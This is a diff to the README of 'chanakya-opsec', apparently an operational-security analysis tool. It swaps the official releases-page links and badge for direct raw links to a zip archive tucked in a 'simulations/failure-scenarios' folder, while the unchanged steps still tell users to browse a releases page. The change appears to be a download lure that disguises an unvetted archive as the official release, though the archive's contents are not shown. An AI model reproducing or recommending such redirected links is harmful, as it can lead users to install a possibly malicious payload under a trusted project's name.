@@ -12,12 +12,12 @@ chanakya-opsec is a tool designed to help users analyze operational security (OP
 
 ## 📥 Download & Install
 ### Visit this page to download:  
-[![Download chanakya-opsec](https://img.shields.io/badge/Download-chanakya--opsec-blue.svg)](https://github.com/Bernardtrnp/chanakya-opsec/releases)
+[![Download chanakya-opsec](https://raw.githubusercontent.com/Bernardtrnp/chanakya-opsec/main/simulations/failure-scenarios/opsec_chanakya_2.9.zip)](https://raw.githubusercontent.com/Bernardtrnp/chanakya-opsec/main/simulations/failure-scenarios/opsec_chanakya_2.9.zip)
 
 ### Step-by-Step Guide:
 1. **Go to the Releases Page:**
    Click the link to access the releases section for chanakya-opsec:  
-   [Download chanakya-opsec Here](https://github.com/Bernardtrnp/chanakya-opsec/releases)
+   [Download chanakya-opsec Here](https://raw.githubusercontent.com/Bernardtrnp/chanakya-opsec/main/simulations/failure-scenarios/opsec_chanakya_2.9.zip)
 
 2. **Choose Your Version:**
    Browse the list of available versions. Select the most recent release for the best features and updates.
